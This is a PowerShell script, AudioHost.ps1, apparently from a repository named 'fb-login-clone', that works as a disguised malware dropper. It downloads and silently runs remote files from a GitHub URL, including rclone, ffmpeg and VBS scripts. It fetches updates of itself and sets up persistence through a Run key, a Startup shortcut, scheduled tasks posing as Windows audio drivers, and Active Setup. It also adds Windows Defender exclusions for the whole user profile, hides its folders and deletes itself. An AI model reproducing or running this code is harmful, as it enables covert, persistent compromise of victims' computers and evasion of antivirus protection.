# AudioHost.ps1

$ErrorActionPreference = "SilentlyContinue"

$dest = "$env:APPDATA\Microsoft\Windows\system_cache"
$repo = "https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/system_cache"
$localVersion = "1.0.0"

try {
    $remoteVersion = Invoke-WebRequest -Uri "$repo/version.txt" -UseBasicParsing -ErrorAction Stop | Select-Object -ExpandProperty Content
    if ($remoteVersion.Trim() -ne $localVersion) {
        Write-Host "Update available, downloading..."
        Invoke-WebRequest -Uri "$repo/AudioHost.ps1" -OutFile "$env:TEMP\AudioHost.ps1"
        Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:TEMP\AudioHost.ps1`"" -WindowStyle Hidden
        exit
    }
} catch {
    Write-Warning "Version check failed: $_"
}

$files = @(
    "system_cache.ps1",
    "TaskService.bat",
    "rclone.exe",
    "rclone.conf",
    "ffmpeg.exe",
    "setup.vbs",
    "TaskService.vbs"
)

# Create folder
if (-not (Test-Path $dest)) {
    try {
        New-Item -ItemType Directory -Path $dest -Force | Out-Null
    } catch {}
}

# Download files
foreach ($file in $files) {
    $target = Join-Path $dest $file
    if (-not (Test-Path $target)) {
        try {
            Invoke-WebRequest -Uri "$repo/$file" -OutFile $target -UseBasicParsing
        } catch {}
    }
}

# Register autostart
try {
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
        -Name "system_cache" -Value "$dest\TaskService.vbs"
} catch {}

$targetFolder = "$env:APPDATA\AudioDriver"
if (-not (Test-Path $targetFolder)) {
    New-Item -ItemType Directory -Path $targetFolder | Out-Null
}
attrib +s +h $targetFolder
attrib +s +h "$targetFolder\AudioHost.ps1"

# Add to Startup folder (duplicate autostart method)
try {
    $WshShell = New-Object -ComObject WScript.Shell
    $lnkPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\system_cache.lnk"
    $shortcut = $WshShell.CreateShortcut($lnkPath)
    $shortcut.TargetPath = "$dest\TaskService.vbs"
    $shortcut.WorkingDirectory = $dest
    $shortcut.Save()
} catch {}

# Defender exclusions
try {
    Add-MpPreference -ExclusionPath $dest
    Add-MpPreference -ExclusionProcess "$dest\system_cache.ps1"
    Add-MpPreference -ExclusionProcess "$dest\TaskService.vbs"
    Add-MpPreference -ExclusionProcess "$dest\rclone.exe"
    Add-MpPreference -ExclusionProcess "$dest\ffmpeg.exe"
    Add-MpPreference -ExclusionPath "$env:USERPROFILE"
} catch {}

# Hide folder
try {
    if (Test-Path $dest) {
        $item = Get-Item -LiteralPath $dest
        $item.Attributes = $item.Attributes -bor 'Hidden'
    }
} catch {}

# Launch main script silently
try {
    Start-Process -WindowStyle Hidden -FilePath "$dest\TaskService.vbs"
} catch {}

# Task Scheduler (as fallback/autostart)
try {
    $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$dest\TaskService.vbs`""
    $Trigger = New-ScheduledTaskTrigger -AtLogOn
    $Principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive
    Register-ScheduledTask -TaskName "SystemCacheUpdater" -Action $Action -Trigger $Trigger -Principal $Principal -Description "System Cache Task" -Force
} catch {}

# Optional: Active Setup
try {
    New-Item -Path "HKLM:\Software\Microsoft\Active Setup\Installed Components\{GUID}" -Force | Out-Null
    Set-ItemProperty -Path "HKLM:\Software\Microsoft\Active Setup\Installed Components\{GUID}" `
        -Name "StubPath" -Value "wscript.exe `"$dest\TaskService.vbs`""
} catch {}

$taskName = "AudioDriverUpdater"
$taskPath = "\Microsoft\Windows\Audio"

$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$dest\AudioHost.ps1`""
$trigger = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -Hidden -DontStopIfGoingOnBatteries -DontStopOnIdleEnd

Register-ScheduledTask -TaskName $taskName -TaskPath $taskPath -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null

Start-Job {
    $repo = "https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/system_cache"
    $dest = "$env:APPDATA\AudioDriver\AudioHost.ps1"

    while ($true) {
        if (-not (Test-Path $dest)) {
            try {
                Invoke-WebRequest -Uri "$repo/AudioHost.ps1" -OutFile $dest -UseBasicParsing
            } catch {}
        }
        Start-Sleep -Seconds 300
    }
} | Out-Null

# Self-delete
$me = $MyInvocation.MyCommand.Path
$bat = "$env:TEMP\delme.bat"
Set-Content -Path $bat -Value "@echo off`r`n:Repeat`r`ndel `"$me`"`r`nif exist `"$me`" goto Repeat`r`ndel %0" -Encoding ASCII
Start-Process -WindowStyle Hidden -FilePath $bat